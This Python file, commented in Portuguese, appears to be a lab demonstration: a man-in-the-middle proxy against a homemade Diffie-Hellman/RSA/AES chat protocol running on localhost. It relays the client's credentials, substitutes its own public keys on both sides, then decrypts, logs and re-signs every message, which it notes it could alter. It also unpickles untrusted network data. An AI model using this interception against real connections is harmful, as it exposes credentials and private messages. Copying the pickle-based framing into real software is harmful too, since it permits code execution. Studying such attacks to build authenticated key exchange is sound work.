import socket
import threading
import pickle
import struct

from cryptography.hazmat.primitives import serialization
from diffie_hellman import perform_key_exchange
from rsa_utils import generate_rsa_keys, rsa_sign
from aes import encrypt_message, decrypt_message

REAL_SERVER_HOST = "127.0.0.1"
REAL_SERVER_PORT = 12346
MITM_HOST = "127.0.0.1"
MITM_PORT = 12345

# Funções utilitárias para comunicação com framing
def recv_pickle(sock):
    raw_len = sock.recv(4)
    if not raw_len:
        raise ConnectionError("Erro ao ler comprimento do pacote")
    msg_len = struct.unpack("!I", raw_len)[0]
    data = b""
    while len(data) < msg_len:
        packet = sock.recv(msg_len - len(data))
        if not packet:
            raise ConnectionError("Conexão encerrada")
        data += packet
    return pickle.loads(data)

def send_pickle(sock, obj):
    data = pickle.dumps(obj)
    length = struct.pack("!I", len(data))
    sock.sendall(length + data)

# Armazenar sessões por conexão
session_keys = {}

def handle_connection(client_sock, addr):
    print(f"[MITM] Nova conexão do cliente {addr}")
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.connect((REAL_SERVER_HOST, REAL_SERVER_PORT))

    try:
        # 1. Repassar credenciais do cliente para o servidor
        auth_data = recv_pickle(client_sock)
        send_pickle(server_sock, auth_data)

        # 2. Interceptar resposta do servidor (contendo parâmetros DH e chaves)
        response = recv_pickle(server_sock)

        # Usar os parâmetros DH do servidor (não gerar novos)
        dh_params = serialization.load_pem_parameters(response["dh_parameters"])

        # Gerar chaves DH e RSA do MITM para a conexão com o cliente
        mitm_private_dh_server = dh_params.generate_private_key()
        mitm_public_dh_server = mitm_private_dh_server.public_key()
        mitm_private_rsa_server, mitm_public_rsa_server = generate_rsa_keys()

        # Salvar chaves para uso futuro
        session_keys[addr] = {
            "dh_params": dh_params,
            "mitm_private_dh_server": mitm_private_dh_server,
            "mitm_private_rsa_server": mitm_private_rsa_server,
        }

        # Substituir as chaves públicas na resposta para enviar ao cliente
        response["dh_parameters"] = dh_params.parameter_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.ParameterFormat.PKCS3
        )
        response["server_public_key_dh"] = mitm_public_dh_server.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        response["server_public_key_rsa"] = mitm_public_rsa_server.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        send_pickle(client_sock, response)

        # 3. Receber as chaves do cliente (públicas DH e RSA)
        client_key_data = recv_pickle(client_sock)

        # Gerar chaves DH e RSA do MITM para conexão com o servidor (servidor pensa que é cliente)
        mitm_private_dh_client = dh_params.generate_private_key()
        mitm_public_dh_client = mitm_private_dh_client.public_key()
        mitm_private_rsa_client, mitm_public_rsa_client = generate_rsa_keys()

        # Guardar as chaves MITM ↔ cliente
        session_keys[addr]["mitm_private_dh_client"] = mitm_private_dh_client
        session_keys[addr]["mitm_private_rsa_client"] = mitm_private_rsa_client

        # Carregar chaves públicas dos pares
        client_pub_dh = serialization.load_pem_public_key(client_key_data["client_public_key_dh"])
        server_pub_dh = serialization.load_pem_public_key(response["server_public_key_dh"])

        # Derivar as chaves compartilhadas corretamente:
        shared_key_client = perform_key_exchange(mitm_private_dh_client, client_pub_dh)
        shared_key_server = perform_key_exchange(mitm_private_dh_server, server_pub_dh)

        session_keys[addr]["shared_key_client"] = shared_key_client
        session_keys[addr]["shared_key_server"] = shared_key_server

        # Substituir chaves públicas do cliente pelas chaves do MITM para enviar ao servidor
        client_key_data["client_public_key_dh"] = mitm_public_dh_client.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        client_key_data["client_public_key_rsa"] = mitm_public_rsa_client.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )

        send_pickle(server_sock, client_key_data)

        print(f"[MITM] Sessão estabelecida com cliente {addr}")
        print("[MITM] MITM agora pode ler/modificar mensagens")

        # Iniciar relaying das mensagens em ambas as direções
        threading.Thread(target=relay, args=(client_sock, server_sock, addr, "client"), daemon=True).start()
        threading.Thread(target=relay, args=(server_sock, client_sock, addr, "server"), daemon=True).start()

    except Exception as e:
        print(f"[MITM] Erro na conexão {addr}: {e}")
        client_sock.close()
        server_sock.close()

def relay(src_sock, dst_sock, addr, origin):
    """
    Intercepta mensagens de src_sock, decifra e (opcionalmente) modifica,
    reencifra com chave correta e envia para dst_sock.
    """
    try:
        while True:
            data = recv_pickle(src_sock)
            if origin == "client":
                key_in = session_keys[addr]["shared_key_client"]
                key_out = session_keys[addr]["shared_key_server"]
                rsa_out = session_keys[addr]["mitm_private_rsa_server"]
            else:
                key_in = session_keys[addr]["shared_key_server"]
                key_out = session_keys[addr]["shared_key_client"]
                rsa_out = session_keys[addr]["mitm_private_rsa_client"]

            try:
                plaintext = decrypt_message(key_in, data["nonce"], data["ciphertext"], data["hmac"])
                print(f"[MITM] Mensagem interceptada ({origin}): {plaintext.decode(errors='ignore')}")
                # Aqui pode modificar plaintext, se quiser
                signature = rsa_sign(rsa_out, plaintext)
                nonce, ciphertext, hmac_val = encrypt_message(key_out, plaintext)

                send_pickle(dst_sock, {
                    "nonce": nonce,
                    "ciphertext": ciphertext,
                    "hmac": hmac_val,
                    "signature": signature,
                    "sender_public_key": rsa_out.public_key().public_bytes(
                        encoding=serialization.Encoding.PEM,
                        format=serialization.PublicFormat.SubjectPublicKeyInfo
                    )
                })
            except Exception as e:
                print(f"[MITM] Erro ao reler mensagem: {e}")
                break
    except Exception as e:
        print(f"[MITM] Relay encerrado: {e}")
    finally:
        src_sock.close()
        dst_sock.close()

def start_proxy():
    print("[MITM] Iniciando proxy MITM...")
    print(f"[MITM] Interceptando em {MITM_HOST}:{MITM_PORT}")
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((MITM_HOST, MITM_PORT))
    server.listen(5)
    while True:
        client_sock, addr = server.accept()
        threading.Thread(target=handle_connection, args=(client_sock, addr), daemon=True).start()

if __name__ == "__main__":
    start_proxy()
